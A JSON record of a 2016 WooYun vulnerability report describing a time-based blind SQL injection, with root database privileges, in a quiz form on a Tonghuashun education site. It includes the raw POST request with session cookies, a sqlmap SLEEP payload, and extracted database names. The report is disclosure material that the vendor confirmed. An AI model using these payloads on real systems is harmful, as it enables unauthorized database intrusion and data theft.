{"id": 86394, "wybug_id": "wooyun-2016-0187557", "wybug_title": "同花顺某站点MySQL注射（root权限）", "wybug_corp": "同花顺", "wybug_author": "Aasron", "wybug_date": "2016-03-22 09:12", "wybug_open_date": "2016-05-06 13:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-06：\t细节向公众公开  简要描述： 同花顺某站点MySQL注射（root权限）被动测试大法好 详细说明：  \nPOST /question.php?op=new&vid=11111 HTTP/1.1Host: school.10jqka.com.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://school.10jqka.com.cn/question.php?op=submitCookie: __utma=156575163.1622041877.1458570243.1458570243.1458570243.1; __utmc=156575163; __utmz=156575163.1458570243.1.1.utmcsr=eeju.10jqka.com.cn|utmccn=(referral)|utmcmd=referral|utmcct=/; Hm_lvt_78c58f01938e4d85eaf619eae71b4ed1=1458570246; Hm_lpvt_78c58f01938e4d85eaf619eae71b4ed1=1458574949; user=MDpBYXNyb246NGYyYTNjMzhmYjEzNmZhZjkwYmJmZjE1NTllY2ZkNmU6Tm9uZTo1MDA6MzM3Nzg1NzI0OjcsMTExMTExMTExMTEsNDA7NDQsMTEsNDA7NiwxLDQwOzUsMSw0MDoyNzo6OjMyNzc4NTcyNDoxNDU4NTc0MjI4Ojo6MTQ1ODU3NDE0MA%3D%3D; userid=327785724; u_name=Aasron; escapename=Aasron; ticket=9ef8f7d770dc83445314fa13998847d7; historystock=601328; spversion=20130314; PHPSESSID=joibrrs8227g60ka1co36a69u4Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 47question119=362&question120=364&question121=366\n\n注入参数#1 question119注入参数#2 question120注入参数#3 question111\n   漏洞证明：  时间盲注有点慢，我直接贴出部分数据库吧，证明一下，有几个乱码了，但影响不大\nParameter: question119 (POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: question119=362' AND (SELECT * FROM (SELECT(SLEEP(5)))ffpI) AND 'gGSE'='gGSE&question120=364&question121=366&vid=11111---[02:51:40] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.12\n\n<code>[02:51:40] [INFO] fetching database names[02:51:40] [INFO] fetching number of database[02:51:40] [INFO] resumed: 58[02:51:40] [INFO] resumed: information_schema[02:51:40] [INFO] resumed: 10_bott\\x04Am_stoc[02:51:40] [INFO] resumed: 10jqka_info[02:51:40] [INFO] resumed: 163[02:51:40] [INFO] resumed: abc123[02:51:40] [INFO] resumed: analysi\\x04B[02:51:40] [INFO] resumed: appdb[02:51:40] [INFO] resumed: baike[02:51:40] [INFO] resumed: bbs_nexus_com_}n[02:51:40] [INFO] resumed: collection[02:51:40] [INFO] resumed: datacenter[02:51:40] [INFO] resumed: datapop[02:51:40] [INFO] resumed: dcxj[02:51:40] [INFO] resumed: fetch_hqB[02:51:40] [INFO] resumed: gwdata[02:51:40] [INFO] resumed: hexinzx[02:51:40] [INFO] resumed: inv\\x7fst_comb_new[02:51:40] [INFO] resumed: investigation[02:51:40] [INFO] resumed: k}ngkey[02:51:40] [INFO] resumed: level2_tyzx[02:51:40] [INFO] resumed: \\x7fog[02:51:40] [INFO] resumed: log1[02:51:40] [INFO] resumed: logs[02:51:40] [INFO] resumed: lost+found[02:51:40] [INFO] resumed: mysql[02:51:40] [INFO] resumed: nexus[02:51:40] [INFO] resumed: n\\x81ke[02:51:40] [INFO] resumed: pass[02:51:40] [INFO] resumed: qu\\x04Asti\\x04Vn[02:51:40] [INFO] resumed: sales_adm\\x04An\n</code>\n当前数据库用户：root@10.0.0.22\n   修复方案：  过滤   版权声明：转载请注明来源 Aasron@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2016-03-22 13:38 厂商回复： 漏洞已经确认，正在进行处理，谢谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}